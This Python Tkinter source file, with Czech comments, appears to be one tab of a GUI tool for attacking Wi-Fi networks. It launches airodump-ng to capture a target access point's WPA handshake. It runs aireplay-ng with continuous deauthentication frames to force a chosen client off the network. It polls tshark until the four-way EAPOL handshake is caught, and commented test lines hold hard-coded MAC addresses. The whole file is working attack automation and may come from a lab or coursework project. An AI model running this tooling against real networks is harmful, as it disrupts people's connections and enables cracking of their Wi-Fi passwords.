import subprocess
import tkinter as tk
from tkinter import ttk
from tkinter import *
from threading import Thread
import time
import signal
import os
from src import global_names

# ========================================================================================================================
# Globální proměnná pro uchování reference na nekončící procesy pro jejich pozdější ukončení
airodump_client_process = None
deauth_process = None


# Globální flagy pro ukončování threadů
stop_parse_handshake_cap = False    # ukončení threadu tsharku pro filtrování eapol rámců

# Pomocná proměnná, pomocí které vypisuju výstup z airodump an stdout.... TODO delete
capture = None

# Názvy výstupních a pomocných souborů
output_handshake = global_names.output_handshake
output_handshake_prefix = global_names.output_handshake_prefix



files_in_current_dir = os.listdir('tmp')

# Filter files that start with the prefix
files_to_delete = [file for file in files_in_current_dir if file.startswith(output_handshake_prefix)]

# Delete the filtered files
for file in files_to_delete:
    os.remove('tmp/'+file)


# ========================================================================================================================
# === T2 =================================================================================================================
def start_handshake_catch():
    print("===== START HANDSHAKE CATCHING ======================")

    # Zapnu pobihani progress baru u WPA handshake zachyceni
    handshake_catch_progress.start(10)

    ch = global_names.ch
    ap = global_names.ap
    interface = global_names.interface

    #Příkaz shellu airmon-ng, který budu spouštět v samostatném vlákně
    command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface} > /dev/null"   # TODO =============

    # FOR TESTING ONLY!:
    #command_catch_handshake = f"sudo airodump-ng -c5 -d CC:2D:E0:C2:EE:6B -w out_handshake wlan1"

    print("COMMAND: " + command_catch_handshake)
    
    # Pro názornost vypíšu spouštěný příkaz do labelu
    handshake_command.configure(text=command_catch_handshake)

    # Nastavuji správně tlačítka
    handshake_catch_on_button.configure(state=DISABLED) 
    handshake_catch_off_button.configure(state=NORMAL) 

    # Spouštím process zachytávání handshaku na zvoleném rozhraní
    # TODO použití exception pro spuštění child processu
    global airodump_target_process
    global capture

    print(" -- spuštím airodump na target")
    # TODO tady je zatím výstup na stdout - později změnit na PIPE
    airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    
    #global parse_handshake_cap_thread
    Thread(target=parse_handshake_cap, daemon=True).start() #================= TODO
    #print(" - Thread s parsováním byl spuštěn")
    global deauth_frame
    global handshake_catch_frame
    handshake_catch_frame.config(highlightthickness=0)
    deauth_frame.config(highlightbackground=global_names.my_color, highlightthickness=3,highlightcolor=global_names.my_color)

# ========================================================================================================================
def stop_handshake_catch():
    print("===== STOP HANDSHAKE CATCHING =============================")

    # Zastavuji progress bar pro zachytavani handshaku
    handshake_catch_progress.stop()

    global airodump_target_process
    if airodump_target_process:
        os.killpg(os.getpgid(airodump_target_process.pid), signal.SIGTERM)
        print("     -- Process zachytávání handshaku byl ukončen.")

    global stop_parse_handshake_cap
    stop_parse_handshake_cap = True

    # Nastavuji správně tlačítka
    handshake_catch_on_button.configure(state=NORMAL) 
    handshake_catch_off_button.configure(state=DISABLED)
    global handshake_catch_frame
    handshake_catch_frame.config(highlightthickness=0)


# ========================================================================================================================
def start_deauthentification():
    print("===== START DEAUTHENTICATING =============================")
    # Zapínám pohyb progress baru
    deauth_progress.start(10)

    #deauth_cadency = 0 nebo 10 ?
    # Testování funkčních hodnot ( --ignore-negative-one  )
    deauth_cadency = 0
    cl = global_names.cl
    ap = global_names.ap
    interface = global_names.interface

    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c {cl} -a {ap} {interface}"
    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -D -c {cl} -a {ap} {interface} > /dev/null"  # TODO ====================
    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c BC:1A:E4:92:5E:25 -a CC:2D:E0:C2:EE:6B wlan1"
    print("COMMAND: " + command_deauth)

    #Vypíšu pro názornost spouštěný příkaz
    deauth_command_label.configure(text=command_deauth)

    # Spouštím proces posílání deauthentifikačních rámců na klienta. Jeho PID si uložím pro pozdější zastavení
    global deauth_process 
    #deauth_process = subprocess.Popen(command_deauth, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    deauth_process = subprocess.Popen(command_deauth, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)   # TODO ====================

    # Nastavuji správně tlačítka
    deauth_on_button.configure(state=DISABLED) 
    deauth_off_button.configure(state=NORMAL) 
# ========================================================================================================================
def stop_deauthentification():
    print("===== STOP DEAUTHENTICATING =============================")
    # Zastavuji process posílání deauth paketů
    global deauth_process
    if deauth_process:
        os.killpg(os.getpgid(deauth_process.pid), signal.SIGTERM)
        print("     -- Process posílání deauth rámců byl ukončen.")

    # Nastavuji správně tlačítka
    deauth_on_button.configure(state=NORMAL) 
    deauth_off_button.configure(state=DISABLED)

    # Zastavuji progress bar pro zachytavani handshaku
    deauth_progress.stop()
# ========================================================================================================================
def parse_handshake_cap():
    print("===== START PARSING HANDSHAKE .CAP ====================================================")
    # Flag pro zastaveni parsovani v okamziku, kdy najdu vice nez 4 zpravy EAPOL  
    captured = False

    tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" | grep \"Message 4 of 4\""
    print("COMMAND: "+ tshark_command)

    print("     -- Začínám cyklus čtení " + output_handshake)
    #print("     -- Captured: " + str(captured))

    handshake_finished_label.config(text="Handshake ještě nebyl zachycen...", fg='grey')
    global stop_parse_handshake_cap

    while (not captured) and (not stop_parse_handshake_cap):
        try:
            tshark_process = subprocess.Popen(tshark_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
            time.sleep(1) 

            nlines = 0
            out, err = tshark_process.communicate()
            out2 = out.decode()
            if out2:
                for line in out2.split('\n'):
                    if line.strip(): 
                        nlines += 1
                        
            #nlines = len(out2.splitlines())
            #print("      - Zachycené zprávy eapol handshaku: " + str(nlines))
            if nlines >= 1:         
                print("     ------------------------------------------------------")
                print("     -- HANDSHAKE BYL ZACHYCEN (Captured Message 4 of 4) --")
                print("     ------------------------------------------------------")
                handshake_finished_label.config(text="Handshake byl zachycen!", fg='green')
                captured = True
                global_names.finished_tab = 1
                global button_next
                button_next.config(bg=global_names.my_color)

                global deauth_frame
                global handshake_catch_frame
                handshake_catch_frame.config(highlightbackground=global_names.my_color, highlightthickness=3,highlightcolor=global_names.my_color)
                deauth_frame.config(highlightthickness=0)

                # TODO Zezelenat tlačítko!

        except FileNotFoundError:
            #status.config(text="File not found. Waiting...")
            print("     -- No file to read...")
        # Kontroluji soubor každou sekundu
    print("=== DEBUG: Zachycen handshake, ukončuji vlakno ===")
 

# ========================================================================================================================================
# Tab "Záchyt handshaku" =================================================================================================================
def draw_capture(frame_t2, btn_next):
    global button_next
    button_next = btn_next

    # WPA Catch Frame ========================================================================================================================
    global handshake_catch_frame
    handshake_catch_frame = LabelFrame(frame_t2, text="Záchyt WPA handshaku")
    # Postarám se o to, že je zvýrazněný frame ve správný okamžik
    #if global_names.finished_tab == 0:
    handshake_catch_frame.config(highlightbackground=global_names.my_color, highlightthickness=3,highlightcolor=global_names.my_color)
    handshake_catch_frame.pack(padx=10,pady=5, fill='x')

    handshake_catch_label = Label(handshake_catch_frame, text="Spustit proces na zachytávání komunikace klienta s AP a zachycením WPA handshaku:")
    global handshake_catch_on_button
    global handshake_catch_off_button
    handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", width= 20, command=start_handshake_catch)
    handshake_catch_off_button = Button(handshake_catch_frame, text="Zastavit", width= 20, state=DISABLED, command=stop_handshake_catch)

    handshake_catch_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
    handshake_catch_on_button.grid(row=0,column=1, pady=5, padx=5)
    handshake_catch_off_button.grid(row=0,column=2, pady=5, padx=5)

    global handshake_catch_progress
    handshake_catch_progress = ttk.Progressbar(handshake_catch_frame, orient=HORIZONTAL, mode='indeterminate')
    handshake_catch_progress.step(0)
    handshake_catch_progress.grid(row=1,column=0,columnspan=4, sticky=EW, padx=15, pady=5)

    global handshake_command
    handshake_command = Label(handshake_catch_frame, text="")
    handshake_command.grid(row=2, column=0, columnspan=4, pady=5)

    #handshake_catch_textarea = scrolledtext.ScrolledText(handshake_catch_frame, wrap=tk.WORD, width=98, height=20)
    #handshake_catch_textarea.grid(row=3, column=0, columnspan=3, padx=10, pady=10)
    global handshake_finished_label
    handshake_finished_label = Label(handshake_catch_frame, text="Spusťte zachytávání handshaku!", font=('Helvetica', 16))
    handshake_finished_label.grid(row=3, column=0, columnspan=4, padx=5, pady=5)

    handshake_catch_frame.grid_columnconfigure(3, weight=1)

    # Deauthificate Frame ========================================================================================================================
    global deauth_frame
    deauth_frame = LabelFrame(frame_t2, text="Deauthentifikace target klienta")
    deauth_frame.pack(padx=10,pady=5, fill='x')

    deauth_label = Label(deauth_frame, text="Spustit proces odpojování komunikace Clienta s AP pro opětovné zaslání handshake:")
    
    global deauth_on_button
    global deauth_off_button
    deauth_on_button = Button(deauth_frame, text="Spustit", width= 20, command=start_deauthentification)
    deauth_off_button = Button(deauth_frame, text="Zastavit", width= 20, state=DISABLED, command=stop_deauthentification)
    deauth_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
    deauth_on_button.grid(row=0,column=1, sticky=W, pady=5, padx=5)
    deauth_off_button.grid(row=0,column=2, sticky=W, pady=5, padx=5)

    global deauth_progress
    deauth_progress = ttk.Progressbar(deauth_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
    deauth_progress.step(0)
    deauth_progress.grid(row=1,column=0,columnspan=4, sticky=EW, padx=15, pady=5)

    global deauth_command_label
    deauth_command_label = Label(deauth_frame, text="")
    deauth_command_label.grid(row=2, column=0, columnspan=4, pady=5)

    deauth_frame.grid_columnconfigure(3, weight=1)
